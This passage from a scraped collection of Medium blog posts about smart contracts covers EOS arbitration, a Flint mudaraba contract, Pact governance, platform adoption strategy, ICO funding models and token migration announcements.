Smart Contract\u00a0DisputesAmy WanBlockedUnblockFollowFollowingJun 22, 2018Much has been made online over EOS\u2019s handling of its first arbitration case earlier this week. For those who don\u2019t know, a group of the chain\u2019s block producers made a decision to freeze specific accounts in response to an apparent theft. An arbiter has ruled to freeze the tokens for now and return them from the alleged thieves to their original holders. It appears, from the evidence, that the block producers judged the situation correctly as an attempted theft and that justice was served.However, despite the seemingly happy resolution of this specific incident, the way it was handled raises important and troubling questions for EOS and the broader blockchain community, as many observers have noted in the days since the event. Crucially, the decision was made by a nebulous group of network insiders with no input from the broader community or recourse to challenge the decision. This inequitable decision-making power\u200a\u2014\u200ayou might call it centralization\u200a\u2014\u200aseems to go against the egalitarian ethos of the blockchain community as well as EOS\u2019s own Constitution.This is not to imply that EOS is wholly in the wrong. As blockchain entrepreneurs ourselves, we are intimately familiar with the unexpected twists and turns inherent in building a technology platform. We are inclined to agree with those who say EOS\u2019s action was an understandable, one-off fix to a fast-moving situation in which the correct action was clear. It was a fudge, but an understandable one, and certainly preferable to the alternative in that instant. Nevertheless, it underscores how much work there is left to do if we are to build an industry with strong, transparent, reliable safeguards for smart contracts.There are some concrete solutions to which we as a community can make a commitment in order to build the strongest possible blockchain future. In the case of smart contracts and arbitration, businesses should adopt a few fundamental best practices.First, we must remember that a strong blockchain platform provides the tools for people to make good decisions. Decentralization does not mean insulation; it just means that participants have control over their assets and information and with whom they decide to share them. Mechanisms for dispute resolution must be robust, but transparent. The reason so many commenters are upset with EOS is the opacity with which it and its block producers acted. All participants must understand and be able to trust the parameters of any transaction they enter into. This transparency must extend to the arbiters, and the community should be able to remove them if they are judged to be corrupt. Transparency, an understanding of best practices, and a strong, equitable system for resolving disputes will be increasingly important as the space matures.EOS has certainly achieved a great deal already, and we celebrate the progress they have made in moving the technology forward. But that should not distract us, as this recent incident makes clear, from doggedly continuing to establish the tools and safeguards the blockchain space will need if it is to be successful. Transparency and reliability in smart contract dispute resolution are a great place to start.", "responses": "1"}, {"title": "Modeling a mudaraba smart\u00a0contract", "author_name": "Nick Doiron", "link": "https://medium.com/@mapmeld/modeling-a-mudaraba-smart-contract-eaa040c5dac6?source=search_post", "post_date": "May 10, 2018", "readtime": "4 min read", "upvotes": "84", "content": "Modeling a mudaraba smart\u00a0contractNick DoironBlockedUnblockFollowFollowingMay 10, 2018In March I started studying toward a certificate in Islamic Microfinance. As I\u2019ve discussed earlier on Medium, Islamic Finance uses alternative financial structures to avoid charging interest, reject speculative or unfair contracts, and audit its investments to ensure no income from non-halal/haraam business.Last summer I wrote about how Bitcoin and other cryptocurrencies could potentially empower Islamic finance and microcredit loans, and it\u2019s one of my more popular posts. Without interest income, Islamic banks make money and compete on fees, which could be reduced and made available via low-fee, automated systems.Smart contracts could potentially make that happen, but millions of dollars have been lost to code exploits or wallets terminated by unauthorized users. Privately I had been sketching out designs for a language or IDE which would divide your code into classes of users, but I didn\u2019t have the necessary background knowledge on compilers.Enter FlintIn May 2018 the Ethereum Foundation gave grants to several promising projects, including $10k to Flint language for smart contracts. Flint restricts users and mutating functions on a language level, and its compiler is written in Swift. You can read more about it here:Flint: A New Language for Safe Smart Contracts on EthereumBackgroundmedium.comTo explore the language, I decided to represent a mudaraba (a common contract from Islamic finance and microfinance) in Flint. Please consider this work a student project, and not official crypto / investment / Islamic finance advice.Basics of\u00a0MudarabaA mudaraba is a type of musharaka (profit-sharing contract) which provides capital to a business. The lender and business owner both invest in the success of the business:If the investment loses money, the loss is split proportionally to the initial investment. It\u2019s easy to remember by thinking what would happen in a 100% loss.If the investment is profitable, those profits are split according to an agreed ratio. Lenders will incentivize the business owner, and compete with each other, by offering a greater share of profits. For example, a 80\u201320 partnership may agree to split profits 70\u201330. In any case, the success of the investment depends on reliable accounting, which typically involves more overhead and complexity (potentially another crypto solution?).Unlike other types of musharaka, a mudaraba lender is typically a \u201csilent partner\u201d and not deeply involved in business decisions.There are additional rules about adjusting the profit ratio and mutual decisions to end the contract, but I don\u2019t want to code everything at once. For this example, we have a fixed profit ratio and either side can end the contract at any time.Initial structureThere are contract instance variables, and blocks which contain multiple functions.What anyone can\u00a0doInitializing a contract happens in the (any) block, because no bank or business address has been set yet. An @ payable function is called when money is paid in, in case you have the smart contract reacting to that.I debated about when the bank/business profit share should be set. At init, neither side has invested funds, but they also want to make sure it\u2019s a trustable contract.if the owner does not invest satisfactory funds or takes time to invest for some reason, the bank can delay calling start() of the contract, or cancel().if the bank does not set the promised profit ratio, or invest satisfactory funds, the owner can cancel() or not move funds into the contractWhat business owners can\u00a0doI want to allow multiple payments into the investment wallet, but the owner shouldn\u2019t be allowed to change the initial investment after the contract has started. Cryptocurrencies don\u2019t have an option to reject or return-to-sender payments, so in a more resilient contract, maybe this balance could be stored in a variable, or there could be a reclaim function.What banks can\u00a0doI\u2019ve created a separate function name investFromBank to avoid conflict with the investFromBusiness function. I\u2019ve also prevented the bank from changing its initial investment.The contract closing\u00a0functionThis is the calculation which matters most; canceling or closing the contract with distributed profits. Here I am relying on code in the \u201cfuture\u201d directory of Flint, so don\u2019t depend on it.In event of the contract closing before it started, I direct to return initial investments.Whenever the contract is closed there would be gas and transaction fees, but I believe that the bank is in the right to charge the client for these fees; in Islamic finance this is permissible even in Qard al-Hassan benevolent loans.Compiling the\u00a0contractDoes any of this work yet? The Flint language repo comes with a Dockerfile where you can start compiling contracts to Ethereum-friendly bytecode. By adding and subtracting pieces, and referring to future docs, I corrected the code which you currently see here.Currently I cannot get \u201csend\u201d into compiling code, and that might be a good thing\u200a\u2014\u200aI would like to see a more specific keyword for emptying the account. I\u2019m not sure how to check the current balance without recording it in an instance variable (Solidity\u2019s deprecated this.balance and newer address-casting-then-balance methods didn\u2019t work). Also I didn\u2019t get a chance to see how the percentage calculation works.I\u2019m excited to continue following this project in the future!", "responses": "1"}, {"title": "Loopring Partnered with SECBIT Labs in Smart Contract Auditing and Formal Verification", "author_name": "Daniel Wang", "link": "https://medium.com/loopring-protocol/loopring-partnered-with-secbit-labs-in-smart-contract-auditing-and-formal-verification-3440e2fe744a?source=search_post", "post_date": "Jul 17, 2018", "readtime": "", "upvotes": "69", "content": "Loopring Partnered with SECBIT Labs in Smart Contract Auditing and Formal VerificationDaniel WangBlockedUnblockFollowFollowingJul 17, 2018Loopring has established a strategic partnership with SECBIT Labs who specialize in smart contract security. The two teams will work closely in Loopring Protocol\u2019s design auditing, code review, and formal verification. SECBIT Labs will also provide security auditing services for all ERC20 token smart contracts to be listed by the Loopring Protocol.Founded by Dr. Yu Guo from USTC, SECBIT Labs focuses on smart contract security. To solve security issues in smart contracts conclusively, it develops a series of tools and services for the smart contract lifecycle: design, development, test, and auditing from aspects of cryptography, semantics, formal verification, game theory, and compiler.SECBIT Labs would offer comprehensive auditing and formal verification for Loopring Protocol 2.0, rooting out vulnerabilities in code and business logic; Also, SECBIT Labs would provide custom smart contract security testing tools and advanced auditing service for Loopring ecosystem to ensure security and normalization of digital assets like tokens, building a healthy and organized Loopring ecosystem.", "responses": ""}, {"title": "Pact: Solving Smart Contract Governance and Upgradeability", "author_name": "Marie Leaf", "link": "https://medium.com/kadena-io/pact-solving-smart-contract-governance-and-upgradeability-976aac3bbb31?source=search_post", "post_date": "Apr 5", "readtime": "5 min read", "upvotes": "476", "content": "Pact: Solving Smart Contract Governance and UpgradeabilityMarie LeafBlockedUnblockFollowFollowingApr 5The blockchain industry undeniably spends a great deal of energy discussing governance, but sometimes the focus of governance gets confused. Usually, the focus is on the blockchain protocol layer, arguing about hard forks and the like. However, a major underexplored topic to consider is governance at the smart contract layer, especially since, for Ethereum at least, certain hard forks were motivated by bugs and exploits in smart contracts, not the protocol itself. Many of the largest (i.e. highest monetary impact) bugs in blockchain\u2019s history were library dependency or multi-signature issues. In smart contracts, we feel it is crucial to specify the details of upgrading\u200a\u2014\u200ahow and who can update the terms and conditions of existing contracts and sign transactions\u200a\u2014\u200ain the smart contract itself.Governance is a method or procedure for the upgrading of smart contracts already running on the blockchain. Governance comes in two distinct forms:* Centralized Governance where a set of individuals, as identified by their public key signatures, are able to update the live contract at will. This is easiest to model as a simple multi-signature scheme.* Distributed Governance where a weighted vote, generally cast by current stakeholders, is held on a specific upgrade. This is a multi-stage process that involves writing code to orchestrate the upgrade process.Governance problems arise in current public blockchains like Ethereum because of their immutable nature. In most environments, once a smart contract is deployed, it cannot be changed without a large-scale network fork or completely abandoning the entire contract application, moving all users\u2019 funds to a reinstated deployment. This is far from ideal, leaving behind valuable data about users\u2019 history that makes blockchain secure. But in the day-to-day flow of normal business operations\u200a\u2014\u200athings change all the time and contracts and workflows need to change to reflect those alterations. These changes should ideally NOT disrupt related workflows or dependencies. Immutability can seem attractive for code on a distributed ledger, making the difficulty seem worth the bother. We\u2019d like to show how our solution is just as secure but still simple and elegant for the smart contract developer.Kadena\u2019s blockchain smart contract language Pact offers a simpler and safer solution for deploying smart contracts, with built-in governance functions and support for updates at any point during the lifecycle of the smart contract, without the need for hard forks.These features will allow developers to resolve critical issues and deploy strategic improvements easily to existing smart contracts and enable individual or enterprise parties to conduct business safely in a trustless and secure environment.Total GovernanceIn Pact, when a smart contract is deployed, governance is directly specified before any code is presented. A keyset (a single or multiple-key signer requirement) can be provided to administrate the smart contract, or a governance function can be referenced (in the body of the smart contract). Keysets provide for simple, centralized governance, e.g. by requiring 2 out of 3 signers to sign off on an upgrade. A governance function opens the full power of the smart contract language to orchestrate an upgrade, allowing for fully democratic or distributed governance, where you gather votes on an upgrade hash and enforce quorum at upgrade time. The point is you have the power to choose how your contract is governed, and others using your contract can\u2019t break your code.Pact offers atomic execution, common for blockchain platforms, ensuring that an individual transaction succeeds or fails as a unit\u200a\u2014\u200aand in failure, the contract is rolled back to its previous state. Applied to governance, this means that upgrades performed in a single transaction cannot be \u201cpartially applied,\u201d further ensuring safety. The combination of atomic execution protecting the upgrade and the power of keysets and governance functions to control the upgrade process makes for a highly robust scheme we like to call \u201cTotal Governance.\u201dExample: Pact fixes Parity Multi-sig HacksUpdating Pact smart contracts occurs inside of a transaction that only commits changes upon successful execution of the new code. This mechanism allows smart contracts to be upgraded to newer versions, even after the smart contract is live and running. Total Governance ensures that changes in upstream dependencies will not break the contract itself. Developers can be assured that their code will maintain its integrity, and fulfill its intended purpose. Pact protects against upstream code breaking downstream code, avoiding instances like the infamous \u201cLeftpad\u201d case that broke the internet, or the case of blockchain, the Parity multi-sig wallet bug.Pact protects users from a single person \u201caccidentally\u201d breaking your code from afar; Pact solves for central library dependency attacks and allows contracts to be truly and securely upgradeable. What\u2019s more, to fix a problem like Parity multi-sig, you wouldn\u2019t need to ask for a hard fork vote from the community if you chose a more reasonable governance model.Contracts as \u201cCryptocharters\u201dOne way to understand what it means to have total governance is to look at a smart contract application as more than just code, but as the governing model for an entire distributed company\u200a\u2014\u200aa cryptocharter. The term \u201ccryptocharter\u201d is meant to reflect the idea that smart contracts are more than just code\u200a\u2014\u200athey should represent your business logic or organization workflow. Pact cryptocharters are smart contracts that have governance options built-in to make them \u201csmarter\u201d and safer.This essentially means that for the first time ever, smart contract developers can easily model governance structures according to their preferences, without needing to resort to backdoor mechanisms, hard forks, or risky data structures.Some other examples of features in Pact that support its ease of use and cryptocharters:Pact cryptocharters have plain text names and associated hashes: importing a payments module is as simple as `(use \u2018payments)`. For added security, the hash of the module can be added to the import like so `(use \u2018payments <hash>)`. During import, if the latest version of `\u2019payments` doesn\u2019t have the correct hash, the load transaction fails harmlessly.Pact is a Turing Incomplete language. This means your contracts and code can\u2019t run itself into unbounded loops. Even our non-technical team discovered the importance of this feature when questioning what Turing completeness means in the context of blockchain.You\u2019ll be hard pressed to find another blockchain platform and smart contract language that solves the problems that Pact can.Conclusion: What You Can Do With Pact\u00a0NowTry Pact out in your browser, no downloads required!Want to become a Pact developer? Check out Pactlang.org\u2019s Tutorial CurriculumCheck out our Github\u200a\u2014\u200aPact is fully open source with Formal Verification tools baked-inAdditional Resources and Read the Docs", "responses": ""}, {"title": "The Smart Contract Platform Master Plan. Fostering Adoption is\u00a0key", "author_name": "James Kilroe", "link": "https://medium.com/newtown-partners/the-smart-contract-platform-master-plan-fostering-adoption-is-key-2144b461386d?source=search_post", "post_date": "Jun 7, 2018", "readtime": "9 min read", "upvotes": "227", "content": "The Smart Contract Platform Master Plan. Fostering Adoption is\u00a0keyJames KilroeBlockedUnblockFollowFollowingJun 7, 2018EOS is about to launch its mainnet this week after a year of anticipation and a $4 billion+ raise. It is the first of many new smart contract platforms that will launch in the next 12 months. Second generation smart contract platforms such as Tezos, Cardano and Dfinity, have all raised a staggering amount of money, more than $5 billion combined. These chains are all in a race to become the biggest network and to do that, they need to beat Ethereum. This post will look at how far ahead Ethereum is, how these new cash rich platforms can catch up and how investors can make decisions on who will win the upcoming platform war.Ethereum\u2019s leadBefore discussing how to win the platform war, it\u2019s useful to look at a snapshot of the current Ethereum ecosystem and its lead. Consensys released a report that highlighted its current scale.Some key points from the report include:Over 1,500 DApps are built on Ethereum.MetaMask, the in-browser wallet extension, has over 1 million users.94% of the top 100 and 87% of the top 800 tokens run on Ethereum.So basically, every recognized DApp is built on Ethereum.If we look at the development side, one development framework for Ethereum\u00a0, Truffle, is sitting at nearly 550,000 downloads. Github lists 14,000 repositories and 220,000 commits concerning Ethereum. Most impressively, the Ethereum developer community is estimated at 250,000 people.This is a significant lead and one that has been built up over the last three years. Consensys is the central nervous system of the Ethereum ecosystem. The Consensys mesh has been broken into three arms, Core Components (i.e. infrastructure and developer tools), Services (i.e. company support services) and Applications (i.e. new companies). It has over 1000 people working on 50+ projects globally, all targeted at expanding the use case of Ethereum.WINNING THE\u00a0WARPick your battlegroundThere will be a smart contract platform war over the next 12\u201324 months as projects fight for adoption. Winning this war will take a well-targeted go-to-market strategy. As a platform foundation, the first step in such a strategy is determining how your platform is superior to others. Most respected analysts are expecting 2\u20135 platforms to emerge as winners, and I tend to agree with them, as the number of unique characteristics needed by platforms are limited. This means that platforms must focus on building an ecosystem of projects that are well suited to these strengths. Play to your strengths!For example, EOS is seen as platform grade resistant, not censorship grade resistant i.e. EOS is immutable if a platform, like Facebook or Google, tries to attack it, but not if sovereign entities, like a government, attack it. Thus, EOS would not be good at the wealth storage application (e.g. digital gold/Bitcoin), but would suit most DApps. More specifically, its low latency would suit DApps requiring large volumes of data to be written on-chain quickly (e.g. a decentralized social network). Tezos is a self-amending Ledger whose consensus mechanism should prevent forks. This should suit any project which emphasises governance, i.e. a decentralized organization.Create your\u00a0armyOnce the foundation has decided on the best types of DApps, it should start to seed these areas aggressively. This should be done by creating a three-pillared ecosystem acceleration structure, in a similar vein to Consensys. The pillars should focus on: Core and Developer Infrastructure, DApp Development, and Outreach. A note, that the main difference to Consensys is that there is no services arm. This is because I believe that a vast number of firms that service DApps already exist and will help another platform if they can receive training and have clients. I do not feel that a foundation will help by centralizing these roles. In fact, centralized services may cause people to become disillusioned with the platform if they cannot compete with the preferred centralized provider.Go to\u00a0warThe last question is how to convert one resource (money) into a successful ecosystem of users, companies, developers and more money. These four aspects create strong network effects as they improve the quality of the ecosystem through positive feedback loops (more users, means more money, means more companies, means more developers, etc). I am going to show how to convert money into such an ecosystem by using EOS as an example. Although the amount of money involved is staggering, I still believe that the EOS foundation (in this case Block.one) should spend between 25%-50% of its total raise on the ecosystem acceleration structure. For reference, I am assuming that the EOS team spends its committed $1 billion on Core and Developer Infrastructure, DApp Development and Conversions, a subsection of Outreach. I have excluded the other section of Outreach, marketing and education, as, although valuable, I believe these elements are well understood.1. Core Infrastructure\u200a\u2014\u200a10% of funds ($100\u00a0mil)An ecosystem needs core applications to make it usable. The second generation blockchains must aggressively fund teams that build core infrastructure in order to meet this need.Wallet applicationsMyEtherWallet facilitates millions of dollars of transactions. EOS must fund the development of an alternative as this helps onboard people to the ecosystem and drive liquidity. This alternative wallet should store EOS and EOS token derivatives.An in-browser plugin wallet, such as Metamask.Hardware wallet integrationMany crypto users only trade with hardware wallets. So, smart contracts must integrate with hardware wallets, such as Ledger and Trezor. Importantly, the standard for tokens on top of the platform (e.g EOS\u2019s ERC-20 equivalent standard) must work with hardware wallets. Smart contract foundations should pay companies such as Ledger to fast track their integration.Liquidity-paired ExchangeThe key to becoming a \u2018reserve currency\u2019 is being the anchor currency in key trading pairs. ETH is considered a \u2018reserve currency\u2019 as it is a major trading pair in many exchanges, largely due to the number of popular ERC-20 pairs and relative ease (from a technical and practical standpoint) for an exchange to enable the said pair. In this regard, EOS should fund the development of its own exchange (with EOS as a key trading pair). This lets EOS become more liquid, but it also allows EOS to become a \u2018reserve currency\u2019. ETH has achieved reserve currency status as many of the projects, which raised money in ETH, haven\u2019t withdrawn it to BTC or fiat. \u2018Hodler Projects\u2019 create velocity sinks and trap value, which causes increases in token value, but that phenomenon is for a separate post.The EOS exchange can prioritize the listing of tokens based on top of EOS. Listing is a major issue for projects. Guaranteed listing would entice new token projects to build on top of EOS because easy listing allows for liquidity, which is attractive to token sale investors.2. Incubator\u200a\u2014\u200a10% ($100\u00a0mil)The EOS team (i.e. Block.one) should fund an incubator. The incubator should focus on projects best suited for the EOS platform. As discussed above, EOS is a more centralized, higher throughput platform best suited for projects such as gaming or decentralized social networks. Not surprisingly, EOS and Steem have the same founder. The incubator program should be set up in multiple global cities (I suggest five or more) over multiple years to create a sustainable and diverse multilingual community. It should host hackathons, have open hot desks and partner with local universities. The EOS community should be nurtured around these incubators. A fraction of the funds should be spent on the actual buildings, rather, the majority should be spent on funding exciting teams and projects. A $100 million incubator with a funnel model could fund 350 projects\u200a\u2014\u200aassuming $70 million toward investments, with all projects getting $100,000 seed and 10% of the projects getting $1 million of follow-on funding. One can easily see the global impact that this program would have. It would become the \u2018Y-Combinator of blockchain\u2019. In comparison, Consensys (the most prolific builder of DApps), has \u00b150 projects in its mesh. Furthermore, this program would help lure some of the 250,000 Ethereum developers into the EOS ecosystem.If done correctly, the incubator would generate additional money for Block.one. Although, it shouldn\u2019t be measured strictly on ROI, but rather ROI and impact. i.e. how many developers it has attracted to the ecosystem.3. Accelerator Fund\u200a\u2014\u200a20% ($200\u00a0mil)The Accelerator fund would further supplement the incubator, but launch 6\u201312 months afterwards. It could invest in the most promising token projects, as well as projects from the incubator. This fund should have a pure ROI mandate, but be restricted to investing in EOS-based projects only. As the fund is large (up to $200 million), it should invest in multiple cities and multiple EOS ecosystems.4. Venture Fund\u200a\u2014\u200a20% ($200\u00a0mil)The venture fund should be launched 12\u201324 months after the incubator. It would be a large fund that would invest in long-term projects. The fund must be run by a team that believes in the investment potential of DApps. I believe that this fund should not be managed by a crypto-hedge fund, but rather a venture-capital-focused team, with a longer investment horizon and a strong understanding of token economies. I believe that application protocol investment is akin to more traditional VC investment and thus, liquidity shouldn\u2019t be exploited and trading should be minimized. There are hundreds of hedge funds with an investment timeframe of 1 year or less that would not be suitable. The aim of this fund should be to invest in applications that are built on EOS and aim to bring it to mainstream adoption i.e. prioritizse applications which increase the number of users using the platform. Again, this fund should be limited to only applications being built on top of EOS.5. Conversion fund\u200a\u2014\u200a10% ($100\u00a0mil)The conversion fund would actively pursue already developed projects to switch to EOS. This fund would specifically focus on projects which suit EOS better than their current blockchain. For example, Cryptokitties would be better suited to EOS than Ethereum, as would Kin because these applications require a platform with high transactional throughput and a low security environment, thus they only need platform grade resistance. The key for this investment fund would be to create a framework which measures the compatibility of projects with EOS and applies it to applicants. The framework should prioritize projects which can convert quickly and are market-ready. This will drive quick EOS adoption and start driving positive feedback effects.6. Grant fund\u200a\u2014\u200a10% ($100\u00a0mil)This would provide grants for community improvement initiatives, such as developers who produce different token protocol improvements, e.g. an ERC-20 or ERC-721 (for digital collectables) equivalent. There are other improvements that the grant fund can focus on, for example, blockchains need many user-friendly improvements before mainstream adoption. ENS (Ethereum\u2019s DNS) is clunky and difficult to use and a team which creates a good decentralized DNS should be rewarded with a grant.7. Reserve\u200a\u2014\u200a20% ($200\u00a0mil)A reserve to target other avenues of active ecosystem growth.ConclusionSmart contract platforms are going to be locked in an adoption arms race soon and many do not have public plans for the upcoming race. As an investor in them, this is a big concern.EOS is starting to reveal its go-to-market strategy. Although it is similar to the above strategy in terms of venture fund section, Block.one still haven\u2019t prioritized incubation of projects or core infrastructure developments. So far, the $50 million, $100 million, $200 million and $325 million funds are for later stage projects. None of these projects are for the critical core infrastructure that will be needed by teams building on EOS.Overall, I believe the winning platform will be one that has a well executed, aggressive adoption plan such as the one above. Although the plan above is EOS-focused, it shows that aggressively developing an ecosystem can drive network effects, which in turn, will make the difference between success and failure for these smart contract platforms.Disclaimer: I own a tiny amount of different smart contract tokens, including EOS tokens.", "responses": ""}, {"title": "Qobit Official Announcement of New Smart\u00a0Contract", "author_name": "Qobit.com", "link": "https://medium.com/@Qobit/qobit-official-announcement-of-new-smart-contract-d3657c00d85c?source=search_post", "post_date": "Nov 28, 2018", "readtime": "", "upvotes": "60", "content": "Qobit Official Announcement of New Smart\u00a0ContractQobit.comBlockedUnblockFollowFollowingNov 28, 2018Qobit Official Announcement:A serious security issue has been found while we were auditing and creating new Smart Contract for our private investors. In order to guarantee the benefits of all our Qobit investors, we decide to create a new token QOB\uff080x1a75288226ad60431eb7759430cdf764e2bb56ea\uff09, to replace the old token QOBI\uff080x1f08c3f43b3b6481989bfd13288ffe054c451634). The exchange of QOBI to QOB will be with ratio of 1:1, which has been transferred smoothly. Please do check your wallet for confirmation.The transfer of QOB for last bounty program will be done today.We are sorry for the inconvenience and thank every qobiter for your support.Qobit Team Nov. 29, 2018", "responses": ""}, {"title": "Blockchain smart contracts: avoid the\u00a0pitfalls", "author_name": "Michael Barnard", "link": "https://hackernoon.com/blockchain-smart-contracts-avoid-the-pitfalls-6acc4104d739?source=search_post", "post_date": "Oct 5, 2018", "readtime": "14 min read", "upvotes": "88", "content": "Blockchain smart contracts: avoid the\u00a0pitfalls9 factors to address when architecting your smart contractsMichael BarnardBlockedUnblockFollowFollowingOct 5, 2018Courtesy https://commons.wikimedia.orgSmart contracts, a primary focus of distributed applications on blockchain technologies, are a key area expected to deliver disruption. But while there is strong potential, there are challenges to overcome.Many of the business implications are specific to the nature of cryptocurrency smart contracts which by nature are escrow contracts, in which the smart contract itself acts as the trusted 3rd party holding the payment. If the contractual terms are met, the payment is made. If the contractual terms are not met, the payment is returned to the buyer.There are nine business characteristics with business implications which must be assessed for any given smart contract solution.Herstatt risk due to currency volatilityTime value of moneySpeed of transactionsCost of transactionsAccounts receivable and default costsPenalty clausesMultiplying partiesTrusted contract writersBad contracts", "responses": "3"}, {"title": "A Gnosis Dutch Auction for All? Coming to the WINGS Smart Contract\u00a0Library", "author_name": "WINGS Magazine", "link": "https://blog.wings.ai/a-gnosis-dutch-auction-for-all-in-the-wings-smart-contract-library-92b7b698fa9a?source=search_post", "post_date": "Apr 29, 2017", "readtime": "5 min read", "upvotes": "10", "content": "A Gnosis Dutch Auction for All? Coming to the WINGS Smart Contract\u00a0LibraryBringing best in class funding models to the ecosystemWINGS MagazineBlockedUnblockFollowFollowingApr 29, 2017The last several months have brought to us many innovative funding models,(particularly with the use of Ethereum smart contracts), which vastly expand the realm of what is possible to do far beyond what was achievable just a few years ago using Bitcoin. At the WINGS Foundation one of our goals is to make funding new DAOs easily accessible for projects that are raising capital and on-boarding their first users or customers.The crypto-based crowdfunding sector is still young and many who are conducting Initial Coin Offerings (ICOs), the current parlance for crowdfunding using cryptocurrency, are experimenting with various models which all have their disadvantages and advantages. As the sector starts to mature we believe that several \u201cbest in class\u201d funding models will emerge as dominant designs. To push forward this standardization which we believe will make it easier for people to participate and understand the consequences we plan to develop a crowdfunding smart contracts library for anyone who wishes to launch an ICO on the Ethereum network and utilize the WINGS DAO for feedback, valuation and funding.Let\u2019s review some of the more innovative ICO\u2019s of this year.Dfinity \u201cseed\u201d\u00a0fundingThe Dfinity seed funding intended to raise roughly 1 Million CHF where a trigger was set when the 1 million threshold was reached that would then close the pre-ICO funding within 24 hours. The funding event resulted in about 3.9 Million CHFin funding arriving prior to closing of the funding period in the contract; that\u2019s about 3 million CHF in the span of 24 hours.Additionally, the funding contract enabled Dfinity to account for Bitcoin and Fiat funds via an oracle coded into the crowdfunding smart contract. While the accounting was based on fiat value.Lastly, the contract had defined the conditions for the main funding even allows the Dfinity Foundation to time the start of their ICO.Key innovative take-aways:Funding threshold triggers countdown to close of funding.Fiat based conversion of crypto funds for accounting.Inserting BTC and fiat donations using oracle directly into the crowdfund smart contract (participants must trust the project leads, but if one cannot do that one shouldn\u2019t be giving them money anyway, right?)Conditions for a further round of funding which can be initiated by the project teamCosmos ICOThe much anticipated Cosmos (Tendermint protocol) raised $16.8 million USD in 28 minutes, going well beyond the $10 Million which the terms contract noted as the minimum raise. The terms of the crowdfunding set the the maximum time for the crowdfund at 2 weeks, however it could be terminated earlier either when $10,000,000 was reached if that amount had not been reached within the initial 6 hours, or at any point in the first 6 hours with no maximum. The Cosmos team pulled the trigger within the first hour to bring the funding to a close, having reached 70% above their minimum funding.Furthermore, in addition to minimum and maximum sole contributor amounts, which has already been done before, Cosmos gave a 15% ~ 25% discount to \u201cStrategic Contributors\u201d and \u201cEarly Contributors\u201d; strategic contributors in the context of Cosmos would mean exchanges, who are required as trusted federates in the Cosmos system (similar to the RSK federation).Key innovative take-aways:Very short funding time frame by allowing team to close the ICO and limited to 2 weeks maximum.Bonuses (or discounts) for special contributors.A cap that was only triggered if the ICO failed to reach $10 million in 6 hours of less, which was not triggeredGnosis ICOAn even more anticipated project has been Gnosis. With it\u2019s main rival Augur having raised a sizable sum some years ago, and even as our own WINGS taking advantage of the predictive power of crowds we knew instantly that this one going to be flooded with crypto-cash.The Gnosis auction ran a modified Dutch auction. In the Gnosis case all of the inventory of coins was not sold out instead when the total bids reached $12.5 Million the price was determined and the funding event was closed. Interestingly, there were reports that many millions were still en route when the auction closed, leading to the conclusion that the valuation could have been even higher\u200a\u2014\u200aindeed trading the last few days has implied a $1 Billion valuation.More importantly, and somewhat counter-intuitive to the nature of Dutch auctions, the Gnosis team created book building contracts which allowed ICO participants to commit funds at the highest possible valuation.The remaining coins are locked up for 12 months.Key innovative take-aways:Use book building smart contracts to build and lock in demand prior to the start of an ICOUse a dutch auction model to maximize funding without give up many coins.Lock up remaining coins and keep them for future funding events.Towards a Standard ICO Crowdfunding Smart Contract\u00a0LibraryUsing these ICOs and many others that will occur over the course of the next year WINGS intends to build upon these successes and allow anyone to launch similar ICOs, which the flexibility to tune and mix and match many of these innovative features.If your group is developing an ICO or crowdfunding contract and wish to engage the WINGS DAO for evaluation, forecasting and promotion, please get in touch with one of the Foundation\u2019s staff (support@wings.ai). For select opportunities, we will cover the cost of auditing your ICO contract code by one of our auditing partners.", "responses": ""}, {"title": "Deployment of an Enhanced Smart Contract\u00a0\u2018SWACH\u2019", "author_name": "Swachhcoin", "link": "https://medium.com/@swachhcoin/deployment-of-an-enhanced-smart-contract-swach-941e12d544d?source=search_post", "post_date": "Feb 12", "readtime": "5 min read", "upvotes": "65", "content": "Deployment of an Enhanced Smart Contract\u00a0\u2018SWACH\u2019SwachhcoinBlockedUnblockFollowFollowingFeb 12Hello Community!We are pleased to inform you that our KYC process is almost complete. Thanks to our active community, most of the Swachh Token Holders have completed their KYC process. We shall be sending out the reminder to people who have not yet completed their KYC and also extending the window to complete the same. Again, we regret the inconvenience caused due to the same.Another Important announcement that we would like to make at this time is that we shall be shortly deploying our Enhanced Smart Contract on the Ethereum Mainnet in the presently ongoing Chinese New Year Holiday Period. We originally planned the deployment at a later stage, though migration, however, we have decided to deploy a completely New and Enhanced Smart Contract with a New Ticker Name \u2018SWACH\u2019 due to the following reasons:1. The existence of a token named SCX on Etherdelta and Etherscan:There exist tokens listed on EtherDelta with the ticker name SCX belonging to a different organization. This can result in someone from our community mistakenly purchasing SCX Tokens listed on EtherDelta, posing a significant financial risk to the community members.2. Recovery of tokens\u00a0lost:There have been multiple events during our ICO where some impersonators, through highly sophisticated methods have been successful in obtaining fee in the form of SCX Tokens for services related but not limited to marketing. Those tokens have since been not recovered and pose a significant sell pressure risk amongst others.3. A rescheduled and controlled vesting of management and promoters tokens:Vesting is done so that the tokens released to promoters do not pose a sell pressure risk on the market. Due to our prolonged tokens sale in the bear market, some of the vested tokens have been released due to the passing of release date. However, as of now, with our imminent listing, it is only fair to the community that the management and the promoters comply to a rescheduled vesting which accounts for the updated listing date.4. Induction of new featured in the smart contract:The newly deployed smart contract is an enhanced version of the previously deployed smart contract. A detailed announcement outlining the featured will be published in a while separately.All SCX holder are eligible for 1:1 Swap with \u2018SWACH\u2019 Tokens in compliance with the guidelines mentioned below.All previous SCX Tokens will remain paused forever and will be void after the launch of this new contract.The distribution of newly minted SWACH tokens to all eligible token holders will be done as\u00a0follows:Distribution of Tokens to ICO Participants to be done instantly.Distribution of Tokens to Bounty Participants will be done through vesting as per schedule A given below.Distribution of Tokens to Airdrop Participants (Phase wise: 1, 2 and 3) will be done as per schedule B has given below.Distribution of Tokens to Advisors, Partners, and Promoters will be done through UPDATED vesting as per schedule C given below.Distribution of Tokens to Team will be done through UPDATED vesting as per schedule D given below.*All schedules at the end of announcementThe above vesting has been introduced in some segments and updated in others because of our prolonged Token sale in the bear market. Since we originally planned our listing in the year 2018 and scheduled various vesting accordingly, the delay in the listing has resulted in some of the vested tokens being released before the tokens are traded, thus killing the purpose of vesting altogether. Also, the ongoing bear market calls for the highest standards of controlled vesting. Thus previously unvested tokens have been vested in the interest of all token holders.Our vesting has been planned in such a way that it does not create a significant release and sell pressure at any point in time. The controlled release has been evenly spread throughout the year with the release for different category of token holders happening in different months. We would also like to announce that this controlled release will be followed by our periodic token BuyBack (more about this will be announced in a while).Note: All the vesting can be verified in our smart contract which will be shortly deployed on the main net. We will share the link to the same. We have given least preference to core team in the 